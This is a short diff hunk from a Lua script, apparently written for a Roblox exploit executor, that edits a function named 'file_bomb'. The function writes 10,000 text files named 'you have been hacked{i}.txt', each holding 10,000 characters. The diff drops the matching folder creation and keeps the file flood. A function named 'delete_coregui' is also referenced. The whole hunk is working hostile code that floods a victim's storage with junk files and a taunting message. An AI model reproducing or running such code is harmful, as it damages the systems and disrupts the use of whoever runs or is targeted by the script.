@@ -34,10 +34,9 @@ local function delete_coregui()
 end
 
 local function file_bomb()
-	local ff = ("h"):rep(10000)
+	local textspam = ("h"):rep(10000)
 	for i = 1, 10000 do
-		makefolder(`you have been hacked{i}`)
-		writefile(`you have been hacked{i}.txt`, ff)
+		writefile(`you have been hacked{i}.txt`, textspam)
 	end
 end
 
